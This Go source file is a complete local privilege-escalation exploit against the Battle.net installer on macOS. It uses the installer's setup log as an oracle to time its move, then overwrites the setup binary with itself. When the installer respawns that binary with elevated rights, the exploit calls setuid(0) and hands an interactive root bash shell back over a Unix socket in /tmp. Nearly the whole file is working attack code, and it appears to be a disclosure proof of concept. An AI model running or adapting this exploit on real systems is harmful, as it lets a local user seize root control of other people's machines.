package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path"
	"strings"
	"syscall"
	"time"
)

const (
	unixSocketPath            = "/tmp/blizzard-macos-installer-lpe"
	battleNetSetupLogsDirPath = "/Users/Shared/Battle.net/Setup/bna_2/Logs"
	macOSDialogOracle         = "Respawning bootstrapper: path="
)

func main() {
	if strings.Contains(strings.Join(os.Args, " "), "--elevated") {
		trySetuidAndDialUnixSocket()
		return
	}

	waitAndTryExploit()
}

func trySetuidAndDialUnixSocket() {
	if os.Geteuid() != 0 {
		log.Fatalf("exploit attempt failed - euid is not 0")
	}

	err := syscall.Setuid(0)
	if err != nil {
		log.Fatalf("failed to set uid 0 - %s", err)
	}

	unixSock, err := net.Dial("unix", unixSocketPath)
	if err != nil {
		log.Fatalf("failed to dial - %s", err)
	}

	bash := exec.Command("/bin/bash", "-i")
	bash.Stdout = unixSock
	stdin, err := bash.StdinPipe()
	if err != nil {
		log.Fatalf("failed to get stdin pipe - %s", err)
	}
	stderr, err := bash.StderrPipe()
	if err != nil {
		log.Fatalf("failed to get stderr pipe - %s", err)
	}

	// This is a half-ass effort to eliminate "echoes" of strings
	// that are written to the shell. There is no easy way to
	// this without disabling the prompt entirely, or just
	// using '/bin/sh'... All of which are not as shiny.
	ignore := make(chan string, 1)
	go func() {
		scanner := bufio.NewScanner(unixSock)
		scanner.Split(bufio.ScanLines)
		for scanner.Scan() {
			ignore <- scanner.Text() + "\n"
			stdin.Write(append(scanner.Bytes(), '\n'))
		}
		log.Printf("unix socket scanner exited - %s", err)
	}()

	go func() {
		scanner := bufio.NewScanner(stderr)
		scanner.Split(bufio.ScanBytes)
		for scanner.Scan() {
			select {
			case drop := <-ignore:
				if drop == "" {
					continue
				}
				for i := 0; i < len(drop)-1; i++ {
					scanner.Scan()
				}
				continue
			default:
			}
			unixSock.Write(scanner.Bytes())
		}
		log.Printf("stderr scanner exited - %s", err)
	}()

	err = bash.Run()
	if err != nil {
		log.Fatalf("failed to start bash - %s", err)
	}

	log.Printf("done")
	unixSock.Close()
}

func waitAndTryExploit() {
	currentExePath, err := os.Executable()
	if err != nil {
		log.Fatalf("failed to get current executable path - %s", err)
	}

	exeBytes, err := ioutil.ReadFile(currentExePath)
	if err != nil {
		log.Fatalf("failed to read current executable into memory")
	}

	setupBinary := waitForInstallerToPromptForCreds()

	err = setupBinary.Truncate(0)
	if err != nil {
		log.Fatalf("failed to truncate setup binary - %s", err)
	}

	_, err = setupBinary.Write(exeBytes)
	if err != nil {
		log.Fatalf("failed to write proof of concept binary into setup binary")
	}

	log.Println("waiting for exploit binary to start...")

	os.Remove(unixSocketPath)

	unixSocketListener, err := net.Listen("unix", unixSocketPath)
	if err != nil {
		log.Fatalf("failed to listed - %s", err)
	}

	client, err := unixSocketListener.Accept()
	if err != nil {
		log.Fatalf("failed to accept connection - %s", err)
	}

	log.Println("exploit complete")

	onDone := make(chan struct{}, 1)

	go func() {
		io.Copy(os.Stdin, client)
		onDone <- struct{}{}
	}()

	go func() {
		io.Copy(client, os.Stdout)
		onDone <- struct{}{}
	}()

	<-onDone
	client.Close()
	unixSocketListener.Close()
}

func waitForInstallerToPromptForCreds() *os.File {
	filesToIgnore := make(map[string]struct{})
	initialInfos, readErr := ioutil.ReadDir(battleNetSetupLogsDirPath)
	if readErr == nil {
		for _, info := range initialInfos {
			filesToIgnore[path.Join(battleNetSetupLogsDirPath, info.Name())] = struct{}{}
		}
	}

	var logToWatch *os.File
	log.Println("waiting for setup log file to appear...")

outer:
	for {
		time.Sleep(time.Second)

		infos, err := ioutil.ReadDir(battleNetSetupLogsDirPath)
		if err != nil {
			log.Printf("failed to read '%s' - %s", battleNetSetupLogsDirPath, err)
			continue
		}

		for _, info := range infos {
			filePath := path.Join(battleNetSetupLogsDirPath, info.Name())

			if _, hasIt := filesToIgnore[filePath]; hasIt {
				continue
			}

			if !info.IsDir() && strings.HasSuffix(filePath, ".log") {
				f, err := os.Open(filePath)
				if err != nil {
					log.Printf("failed to open log file '%s' - %s", filePath, err)
				}
				logToWatch = f
				break outer
			}
		}
	}

	log.Printf("using log '%s' as an oracle...", logToWatch.Name())
	defer logToWatch.Close()

	start := time.Now()
	for {
		time.Sleep(500*time.Millisecond)
		if time.Since(start) > 2*time.Minute {
			log.Fatalf("timed out waiting for oracle string")
		}

		_, err := logToWatch.Seek(0, 0)
		if err != nil {
			log.Fatalf("failed to seek to log file start - %s", err)
		}

		logFileContents, err := ioutil.ReadAll(logToWatch)
		if err != nil {
			log.Printf("failed to read log file - %s", err)
			continue
		}

		if bytes.Contains(logFileContents, []byte("Respawning bootstrapper: path=")) {
			setupBinary, err := getSetupBinaryFromLog(string(logFileContents))
			if err != nil {
				log.Fatalf("failed to get setup binary path from log file - %s", err)
			}

			return setupBinary
		}
	}
}

// getSetupBinaryFromLog takes a string of the format (multi-lined
// for readability):
//	Respawning bootstrapper: path=/Users/q/Desktop/Battle.net-Setup.app elevate=1
//	arguments={[0]=--cmdver=2, [1]=--elevated, [2]=--locale=enUS, [3]=--mode=setup, [4]=--session=5242971924356877157}
//
// ... and returns a *os.File representing the setup binary.
func getSetupBinaryFromLog(logContents string) (*os.File, error) {
	index := strings.Index(logContents, macOSDialogOracle)
	if index < 0 {
		return nil, fmt.Errorf("failed to find oracle string in log log contents")
	}

	index = index + len(macOSDialogOracle)
	endPath := ".app"
	endIndex := strings.Index(logContents[index:], endPath)
	if endIndex < 0 {
		return nil, fmt.Errorf("failed to find .app end string")
	}

	binaryPath := path.Join(logContents[index:index+endIndex+len(endPath)],
		"Contents/MacOS/Battle.net-Setup")

	return os.OpenFile(binaryPath, os.O_RDWR, 0755)
}
